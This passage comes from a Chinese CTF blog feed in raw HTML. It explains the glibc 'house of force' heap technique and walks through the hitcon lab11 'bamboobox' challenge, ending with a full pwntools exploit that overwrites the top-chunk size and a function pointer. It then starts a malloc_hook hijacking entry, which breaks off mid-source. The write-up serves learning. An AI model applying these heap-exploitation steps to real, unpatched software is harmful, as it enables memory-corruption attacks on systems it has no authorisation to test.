force</code>的这个利用方式并不用伪造堆块，而是通过堆溢出对<code>top_chunk</code>的<code>size</code>位进行修改。然后通过计算<code>top_chunk</code>与<code>目标地址的偏移</code>，从而达到申请任意地址，从而可以造成任意地址写的效果。</li><li><p>这个漏洞利用方式需要的条件：</p><ul><li><code>堆溢出</code>漏洞，这样就可以修改<code>top_chunk</code>的size位</li><li><code>堆地址</code>，我们需要计算偏移就需要堆地址，如果我们要申请到栈上，这时还需要泄露<code>栈上的地址</code>。</li><li>如果申请到<code>bss</code>段：需要<code>malloc()</code>能传参数为负值，如果是申请到栈段则<code>malloc()</code>就需要传递很大的值</li></ul></li><li><p>我们计算偏移需要这样计算：</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">The evil_size is calulcated <span class="title function_">as</span> <span class="params">(nb is the number of bytes requested + space <span class="keyword">for</span> metadata)</span>:</span><br><span class="line">new_top = old_top + nb</span><br><span class="line">nb = new_top - old_top</span><br><span class="line">req + <span class="number">2</span><span class="keyword">sizeof</span>(<span class="type">long</span>) = new_top - old_top</span><br><span class="line">req = new_top - old_top - <span class="number">2</span><span class="keyword">sizeof</span>(<span class="type">long</span>)</span><br><span class="line">req = dest - <span class="number">2</span><span class="keyword">sizeof</span>(<span class="type">long</span>) - old_top - <span class="number">2</span><span class="keyword">sizeof</span>(<span class="type">long</span>)</span><br><span class="line">req = dest - old_top - <span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="type">long</span>)</span><br><span class="line"># 我们要申请的地址就是req = dest - old_top - <span class="number">4</span>*<span class="keyword">sizeof</span>(<span class="type">long</span>)</span><br></pre></td></tr></table></figure><h1 id="house-of-force_level1"><a href="#house-of-force-level1" class="headerlink" title="house-of-force_level1"></a>house-of-force_level1</h1><ul><li>题目来源：hitcontraning_lab11</li></ul><h2 id="level1分析1"><a href="#level1分析1" class="headerlink" title="level1分析1"></a>level1分析1</h2><ul><li>先使用查看一下附件的保护机制。发现是开了<code>canary</code>保护，没有开启PIE保护。</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212143154523.png" alt="image-20250212143154523"></p><ul><li>接下啦我们反编译一下程序，还是老样子先来查看一下<code>main</code>函数<ul><li>该程序的<code>main</code>函数，会先初始化输入输出</li><li>然后会申请一个堆块，这个堆块是由于存储两个函数地址</li><li>然后会调用<code>hello_message</code>函数，输出欢迎用户的信息</li><li>之后调用就是进入循环经典堆菜单题目</li><li>这里也给出<code>hello_message</code>、<code>goodbye_meeage</code>这两个函数输出的具体信息</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212143503208.png" alt="image-20250212143503208"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212143733024.png" alt="image-20250212143733024"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212143757823.png" alt="image-20250212143757823"></p><ul><li>接下来我们查看一下菜单，这时就表面：<ul><li><code>1</code>展示数据</li><li><code>2</code>添加数据</li><li><code>3</code>修改数据</li><li><code>4</code>移除数据</li><li><code>5</code>退出</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212143808000.png" alt="image-20250212143808000"></p><ul><li>现在我们依照<code>增删改查</code>的顺序查看这个堆块，在做堆题一般是先查看<code>add</code>这样我们会更熟悉申请堆块中堆块位置存储的具体数据</li><li>我们先来查看一下<code>add_item()</code>：<ul><li>首先介绍一下三个全局变量，其中<code>num</code>、<code>ptr_array</code>、<code>itemlist</code><ul><li><code>num</code>：统计着我们申请堆块的次数</li><li><code>ptr_array</code>：是一个指针数组，这个数组存储着malloc返回的堆地址</li><li><code>itemlist</code>：是一个<code>int</code>类型的数组,这个数组，存储着每个堆块所申请的大小</li></ul></li><li>该程序先对<code>num</code>进行检查，然后用户可以输入要申请堆块的大小（堆块大小不能为0）</li><li>之后程序就会申请一个堆块，申请完后会让用户输入内容，并在最后添加<code>\x00</code></li><li>最后<code>num</code>这个全局变量会自增</li><li>注：这里的<code>ptr+array+2*i</code>还不知道这个地址如何增加，之后动调看看</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212145117877.png" alt="image-20250212145117877"></p><ul><li>接下来查看<code>remove_item()</code>：<ul><li>该函数的功能就是释放堆块，输入我们要释放堆块的索引</li><li>然后释放相应堆块，并且将<code>ptr_array</code>对应位置设置为<code>0</code>，然后将<code>itemlist</code>对应位置也设置为<code>0</code></li><li>最后<code>num</code>自减</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212145536356.png" alt="image-20250212145536356"></p><ul><li>接下来我们查看<code>change_item()</code>，程序的逻辑大致如下：<ul><li>我们先要选择我们要修改内容的堆块</li><li>之后输入我们要修改多少字节（这边可以造成堆溢出）</li><li>然后调用<code>read</code>函数对相应堆块内容进行修改</li></ul></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212145947815.png" alt="image-20250212145947815"></p><ul><li>接下来查看最后一个函数<code>show_item()</code>，查看一下具体逻辑：输出我们已经申请的所有堆块的相应和索引</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212150427261.png" alt="image-20250212150427261"></p><ul><li>这边我们还注意到一个<code>magic()</code>函数：这边会直接将flag输出</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212150530614.png" alt="image-20250212150530614"></p><h2 id="level1分析2"><a href="#level1分析2" class="headerlink" title="level1分析2"></a>level1分析2</h2><ul><li>这题并不能泄露堆地址，但是一开始我们申请了一个堆块用于存储函数指针，这样我们并不用泄露地址可以直接计算偏移，将<code>top_chunk</code>的位置给改到第一次我们<code>malloc(0x10)</code>这个堆块。</li><li>这样我们就可以劫持<code>goodbye_message()</code>为<code>magic()</code>，这样我们在退出的时候就可以得到flag</li><li>为了<code>magic()</code>能成功调用，我们就先在当前目录下创建一个<code>flag</code>文件，存储着<code>flag&#123;test_flag&#125;</code></li><li>接下来我们就来进行动态调试看看，这里我们先动调查看<code>0x6020C8</code>是如何存储malloc返回的指针，这时我们先创建两个堆块，这时我们就发现反编译的一个错误，其实<code>ptr_array</code>并不存在，只有<code>itemlist</code>存在，按照<code>申请的大小</code>、<code>堆块地址</code>这个顺序存储（但是这个对于我们这题的思路没啥影响）</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212153144903.png" alt="image-20250212153144903"></p><ul><li>所以我们就再尝试申请一个堆块，看看<code>top_chunk</code>和<code>des</code>的偏移,这时我们<code>add(0x10,b&#39;aaaa&#39;)</code></li><li>发现我们写入的堆块如下图所示，同时我们可以计算我们要申请的堆块即偏移地址，也就是<code>des-top_chunk_addr-siezof(long long size)*4</code></li><li>即<code>0x1C06000-0x1C06040-0x20=-0x60</code></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212153524257.png" alt="image-20250212153524257"></p><ul><li>这时我们尝试不修改<code>top_chunk</code>能不能将<code>top_chunk</code>的起始地址修改为<code>0x1c06000</code>，发现会报错</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212154750639.png" alt="image-20250212154750639"></p><ul><li>所以我们在申请负索引的时候就要先修改<code>top_chunk</code>的<code>size</code>位，这时我们利用<code>edit()</code>修改了<code>top_chunk</code>的<code>size</code>位</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212155105634.png" alt="image-20250212155105634"></p><ul><li>这时我们再来申请负值，但是这里出现段错误，也就是这段程序这边出现了问题，这边出现的错误情况是我们申请的堆块太小，导致我们的申请负堆块（如果用无符号整数表示就非常大），这时就会导致失败。</li><li>还有就是如果我们没有改变<code>top_chunk</code>的<code>size</code>位，也会导致报错（所以这时就需要改变<code>top_chunk</code>的size位为<code>-1</code>）</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212161907903.png" alt="image-20250212161907903"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212160319124.png" alt="image-20250212160319124"></p><ul><li>所以我们现在先申请一个<code>0x100</code>大小的堆块，然后再修改，计算偏移后再申请负值的堆块，结果就会如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>+<span class="number">0x10</span>,payload)</span><br><span class="line">add(-(<span class="number">0x100</span>+<span class="number">0x10</span>)-(<span class="number">0x10</span>+<span class="number">0x10</span>)-<span class="number">0x10</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212212449635.png" alt="image-20250212212449635"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212212500567.png" alt="image-20250212212500567"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212212526653.png" alt="image-20250212212526653"></p><ul><li>这个时候就会出现<code>top_chunk</code>的起始地址会在我们这两个函数指针所在堆块的起始地址</li><li>这时我们再申请一个<code>0x10</code>大小的堆块，并修改<code>goodbye_message()</code>这个函数指针即值为<code>0x4008b1</code>将其修改为<code>magic()</code>这个函数的地址<code>0x400D49</code></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212212618493.png" alt="image-20250212212618493"></p><ul><li>这时我们再进行退出，这时就会调用<code>0x400D49</code>这个函数即<code>magic()</code></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212212952487.png" alt="image-20250212212952487"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212213117354.png" alt="image-20250212213117354"></p><ul><li>这时退出就会打印出<code>flag</code>的值</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212213206310.png" alt="image-20250212213206310"></p><h2 id="level1_exp"><a href="#level1-exp" class="headerlink" title="level1_exp"></a>level1_exp</h2><ul><li>exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./bamboobox&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))    <span class="comment">#p.sendafter(b&#x27;Please enter the name of item:&#x27;,context)</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the name of item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the length of item name:&#x27;</span>,<span class="built_in">str</span>(size).encode(<span class="string">&#x27;utf-8&#x27;</span>))    <span class="comment">#p.sendafter(b&#x27;Please enter the new name of the item:&#x27;,context)</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the new name of the item:&#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Please enter the index of item:&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>+<span class="number">0x10</span>,payload)</span><br><span class="line">add(-(<span class="number">0x100</span>+<span class="number">0x10</span>)-(<span class="number">0x10</span>+<span class="number">0x10</span>)-<span class="number">0x10</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">payload =p64(<span class="number">0</span>)+p64(<span class="number">0x400D49</span>)</span><br><span class="line">add(<span class="number">0x10</span>,payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="house-of-force_level2"><a href="#house-of-force-level2" class="headerlink" title="house-of-force_level2"></a>house-of-force_level2</h1><h2 id="level2分析1"><a href="#level2分析1" class="headerlink" title="level2分析1"></a>level2分析1</h2><h2 id="level2分析2"><a href="#level2分析2" class="headerlink" title="level2分析2"></a>level2分析2</h2><h2 id="level2分析3"><a href="#level2分析3" class="headerlink" title="level2分析3"></a>level2分析3</h2><h2 id="level2exp"><a href="#level2exp" class="headerlink" title="level2exp"></a>level2exp</h2><h1 id="利用失效"><a href="#利用失效" class="headerlink" title="利用失效"></a>利用失效</h1><ul><li>在<code>glibc2.29</code>加入了一个检测，<code>system_mem</code>这个记录程序向堆块申请的堆块总字节大小。</li><li>这个检查就导致了<code>house_of_fore</code>基本失效</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250212003427114.png" alt="image-20250212003427114"></p>]]></content>
    
    
    <summary type="html">前言:今天牢了3小时的einherjar结束了脱了10天的堆进度。再学个malloc_hook就可以开始了</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>malloc_hook</title>
    <link href="http://iyheart.github.io/2025/01/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/malloc-hook/"/>
    <id>http://iyheart.github.io/2025/01/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/malloc-hook/</id>
    <published>2025-01-25T12:16:34.000Z</published>
    <updated>2025-02-10T16:23:08.669Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>打堆的一个关键的方法就是劫持堆相关函数中的<code>hook</code>函数。即在堆中的三大<code>hook</code>函数，<code>malloc_hook</code>、<code>realloc_hook</code>、<code>free_hook</code></p></li><li><p>之前看<code>hook</code>利用的时候，感觉不是特别理解，所以就没有看了，今天感觉有点开窍了，就来学习一下，感觉这个学期都没怎么学pwn，学的pwn没有上学期多。参考博客：<a href="https://seanachao.github.io/2020/07/13/hook劫持/">malloc_hook以及free_hook劫持原理 | S3cana’s Blog</a>、<a href="https://grxer.github.io/2023/03/01/malloc-hook&amp;free-hook/">malloc_hook&amp;&amp;free_hook hijack原理</a></p></li></ul><h1 id="hook介绍"><a href="#hook介绍" class="headerlink" title="hook介绍"></a>hook介绍</h1><ul><li><code>hook</code>的就是劫持函数指针，控制程序的执行，让函数执行我们所指定的函数。<ul><li><code>hook</code>翻译过来是<code>钩子</code>。假设<code>a</code>函数中有这样一个执行过程：<code>判断b函数指针是否为空，如果不为空就先b函数指针所指向的函数</code>。这样当我们使用<code>b</code>钩子的时候，我们在执行<code>a</code>函数，执行流就会被<code>b</code>钩子给钩过来，这样就达到了执行<code>b</code>函数指针所指向的函数地址。</li></ul></li><li>为了方便调试程序，在<code>glibc</code>中有四个比较重要的函数指针，分别是<code>malloc_hook</code>、<code>free_hook</code>、<code>realloc_hook</code>、<code>exit_hook</code>。</li><li><p>我们可以通过一些堆漏洞或者其他漏洞就可以将原本指向<code>NULL</code>的这些函数指针，修改为<code>one_gadget</code>，这样我们在满足一定的条件后就可以<code>getshell</code>，这样就是pwn中的劫持<code>hook</code>函数最常见的用法。</p></li><li><p>之后由于<code>hook</code>的存在着比较严重的漏洞利用，在<code>glibc2.34</code>版本及以上就被删除了，所以<code>glibc2.34</code>版本及以上的<code>pwn</code>就不能往劫持这些<code>hook</code>函数去想了。</p></li></ul><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><ul><li>这里可以先去了解一下函数指针。不了解其实也没关系，也就把他当做指针就行。</li><li>这里我是在已经有读一些glibc源码的基础上才学的<code>malloc_hook</code>技术，前置知识可能不太基础。</li></ul><h2 id="malloc函数流程"><a href="#malloc函数流程" class="headerlink" title="malloc函数流程"></a>malloc函数流程</h2><ul><li>通过阅读malloc函数的源码，大致总结出了malloc函数的执行流程，流程图如下</li></ul><p><img src="/2025/01/25/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/malloc-hook/malloc函数流程.png" alt="malloc函数流程"></p><h2 id="malloc函数相关源码"><a href="#malloc函数相关源码" class="headerlink" title="malloc函数相关源码"></a>malloc函数相关源码</h2><ul><li>还是以glibc2.23的malloc相关源码</li></ul><details>    <summary>__libc_malloc</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure></details><details>    <summary>_int_malloc</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span 